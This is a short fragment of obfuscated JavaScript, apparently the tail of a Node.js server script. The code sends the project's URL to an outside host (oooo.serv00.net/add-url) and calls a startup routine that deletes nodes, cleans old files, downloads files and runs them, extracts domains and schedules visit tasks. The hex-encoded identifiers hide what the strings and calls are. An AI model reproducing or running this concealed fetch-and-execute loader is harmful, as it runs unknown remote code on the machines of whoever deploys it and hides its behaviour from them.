axios[_0x29c4b6(0x1b5)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x29c4b6(0x1cf)](_0x29c4b6(0x1f5));}catch(_0x50913d){console['error'](_0x29c4b6(0x16d)+_0x50913d[_0x29c4b6(0x1e8)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x58eb33(0x1c7)](PORT,()=>console[_0x58eb33(0x1cf)](_0x58eb33(0x205)+PORT+'!'));